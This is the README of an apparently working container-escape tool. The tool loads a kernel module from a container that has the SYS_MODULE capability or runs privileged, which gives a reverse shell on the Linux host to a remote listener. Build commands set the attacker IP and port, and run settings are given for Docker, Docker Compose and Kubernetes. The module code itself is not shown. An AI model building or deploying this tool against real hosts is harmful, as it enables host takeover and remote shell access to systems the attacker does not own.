# Container Breakout Using Kernel Modules

# Summary
Containers are extremely useful for rapidly deploying applications. Instead of running an entire operating system on the host (like a virtual machine), containers share the host resources. This makes escaping a container slightly easier than VM. Whether the managed platform is Docker or Kubernetes, this breakout will be effective. Part of the shared resources between container and the host OS, are the host's kernel modules. A privileged container can install, remove, and modify kernel modules on the host from within the container. This project exploits that capability to create a reverse from the local host to a remote server.

## Requirements
This breakout does not work in all use cases. **Two** things must be present for this exploit to function:
* The host system must be Linux
* The container must be started with **SYS_MODULE** capability enabled. The container can also be ran as "privileged".

# Usage

## Building the Image
By default, a simple build of the image will create a reverse shell on 127.0.0.1:4444. Be sure all piecies of the project are in the same directory of Dockerfile.
```
docker build -t imagename /path/to/Dockerfile
```

To specify an IP address and port insure that the image is built with the respective arguments.
```
docker build -t imagename --build-arg IP_ADDRESS=1.1.1.1 --build-arg PORT_NUMBER=23 /path/to/Dockerfile
```
## Running the image
The image can be ran with any container deployment platform either inline, or in the configuration file. Be sure to have a listener activated before running the container.

#### Docker
```
docker run --cap-add=SYS_MODULE imagename
```

#### Docker Compose
Include the following in the config:
```
cap_add:
- SYS_MODULE
```
#### Kubernetes
Include the foallowing in the config:
```
spec:
    containers:
        image: imagename
        securityContext:
            capabilities:
                add:
                - SYS_MODULE
```
